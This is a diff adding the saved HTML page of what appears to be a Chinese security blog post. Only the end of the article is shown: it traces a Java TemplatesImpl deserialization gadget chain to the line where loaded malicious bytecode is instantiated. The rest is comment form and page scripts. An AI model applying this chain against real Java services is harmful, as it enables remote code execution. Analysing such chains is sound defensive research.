+# com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
+# com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance
+# com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses 这一步装载了恶意代码 _bytecodes
+</code></pre><pre><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></pre><p>最终在此处实例化对象并触发了恶意代码</p><p><img src="/usr/uploads/2019/06/121213271.jpg" alt="1561627354(1).jpg" title="1561627354(1).jpg"></p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-176" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/176.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/176.html#respond-post-176" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
